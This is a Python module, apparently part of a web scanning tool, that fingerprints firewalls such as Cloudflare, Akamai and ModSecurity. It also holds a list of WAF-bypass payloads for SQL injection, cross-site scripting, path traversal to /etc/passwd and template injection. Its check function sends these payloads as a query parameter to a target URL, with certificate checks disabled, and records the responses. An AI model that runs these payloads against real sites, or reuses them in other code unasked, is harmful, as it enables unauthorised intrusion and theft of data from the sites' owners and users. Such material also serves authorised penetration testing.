import re
from typing import Optional, Dict, List
import requests

WAF_EVIDENCE = {
    "cloudflare": [r"cloudflare", r"cf-ray", r"__cfduid", r"cloudflare-nginx"],
    "akamai": [r"akamai", r"akamaighost"],
    "mod_security": [r"mod_security", r"Mod Security", r"NOYB"],
    "aws_waf": [r"awswaf", r"AWSWAF"],
    "imperva": [r"incapsula", r"Imperva"],
    "f5_bigip": [r"BigIP", r"F5"],
    "sucuri": [r"sucuri", r"Sucuri"],
    "barracuda": [r"barracuda"],
    "citrix_netscaler": [r"ns_af", r"citrix"],
    "fortinet": [r"fortigate", r"FortiWeb"],
    "wordfence": [r"wordfence"],
}

BYPASS_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "'/**/OR/**/'1'='1",
        "'+OR+'1'='1",
        "'%0aOR%0a'1'='1",
        "'OR 1=1-- ",
        "1' OR '1'='1' /*",
        "1' OR 1=1-- ",
        "admin' --",
        "admin'/*",
        "' UNION SELECT 1,2,3-- ",
        "' UN/**/ION SEL/**/ECT 1,2,3-- ",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script/random=1>alert(1)</script>",
        "<script%%20>alert(1)</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<img src=x onerror=alert(1)>",
        "<IMG SRC=x onerror=alert(1)>",
        "<img src=x onerror=alert(1)>",
    ],
    "lfi": [
        "/../" * 3 + "etc/passwd",
        "/....//....//....//etc/passwd",
        "/..;/..;/..;/etc/passwd",
        "/..%252f..%252f..%252fetc/passwd",
        "/..%c0%ae..%c0%ae..%c0%aetc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%=7*7%>",
        "{{7*'7'}}",
    ],
}


def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
                    timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"detected": False, "name": None, "evidence": []}

    try:
        r = sess.get(url, timeout=timeout, verify=False)
        for waf_name, patterns in WAF_EVIDENCE.items():
            for pat in patterns:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["detected"] = True
                    result["name"] = waf_name
                    result["evidence"].append(pat)
                    break
            if result["detected"]:
                break

        for k in r.headers:
            lower = k.lower()
            if lower in ("x-sucuri-id", "x-sucuri-cache", "cf-ray"):
                result["detected"] = True
                result["name"] = k.split("-")[0].lower()
                result["evidence"].append("header: %s" % k)
    except:
        pass

    return result


def generate_bypasses(vuln_type: str) -> List[str]:
    return BYPASS_PAYLOADS.get(vuln_type, [])


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {
        "waf": fingerprint_waf(url, sess, timeout),
        "bypasses": {},
    }

    for vtype, payloads in BYPASS_PAYLOADS.items():
        if param:
            tested = []
            for payload in payloads[:3]:
                try:
                    sep = "&" if "?" in url else "?"
                    r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                                 timeout=timeout, verify=False)
                    tested.append({"payload": payload[:20], "status": r.status_code,
                                   "length": len(r.text)})
                except:
                    pass
            if tested:
                result["bypasses"][vtype] = tested

    return result
